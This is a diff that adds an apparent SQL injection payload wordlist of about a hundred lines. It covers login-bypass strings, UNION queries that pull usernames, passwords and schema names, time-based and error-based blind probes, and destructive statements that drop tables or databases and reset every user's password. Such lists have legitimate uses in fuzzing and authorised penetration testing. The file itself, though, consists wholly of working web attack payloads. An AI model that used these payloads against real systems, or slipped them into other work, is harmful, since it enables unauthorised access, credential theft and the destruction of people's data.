@@ -1,0 +1,104 @@
+'
+''
+`
+``
+,
+"
+""
+/
+//
+\
+\\
+;
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+' or '1'='1
+' or '1'='1'--
+' or '1'='1'/*
+' or '1'='1'#
+' or 1=1
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+'or 1=1 or ''='
+' or 1=1 LIMIT 1--
+' or '1'='1' LIMIT 1--
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' ORDER BY 4--
+1' ORDER BY 5--
+1' GROUP BY 1,2--
+1' GROUP BY 1,2,3--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT username,password FROM users--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns--
+1; SELECT SLEEP(5)--
+1'; SELECT SLEEP(5)--
+' AND SLEEP(5)--
+' AND SLEEP(5) AND '1'='1
+1' AND SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:5'
+1; WAITFOR DELAY '0:0:5'--
+' AND 1=1--
+' AND 1=2--
+' AND 'one'='one
+' AND 'one'='two
+' AND 1=1#
+' AND 1=2#
+1 AND 1=1
+1 AND 1=2
+1 AND 1=1--
+1 AND 1=2--
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+' OR 'x'='x
+' OR 'x'='x'--
+1 OR 1=1
+1 OR 1=1--
+admin'--
+admin' #
+admin'/*
+' OR 1=1 LIMIT 1--
+' OR '1'='1' LIMIT 1 --
+'OR '' = '
+' OR ''='
+or true--
+' or true--
+') or ('1'='1
+')) or (('1'='1
+' OR 'unusual'='unusual'--
+'; DROP TABLE users--
+'; DROP DATABASE test--
+'; INSERT INTO users VALUES ('hacked','hacked')--
+'; UPDATE users SET password='hacked'--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' AND (SELECT 1 FROM (SELECT SLEEP(5))A)--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--
+' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,(SELECT version()),0x7e,0x41))s), 8446744073709551610, 8446744073709551610)))--
+1 AND 1=1 UNION SELECT 1,version()--
+1 AND 1=1 UNION SELECT 1,database()--
+1 AND 1=1 UNION SELECT 1,user()--
+' AND 1=0 UNION SELECT 1,version()--
+' AND 1=0 UNION SELECT 1,database()--
+' AND 1=0 UNION SELECT 1,user()--
+0x27
+0x6f72 0x313d31
+' OR 1 GROUP BY CONCAT(version(),0x3a,floor(rand(0)*2)) HAVING MIN(0)--
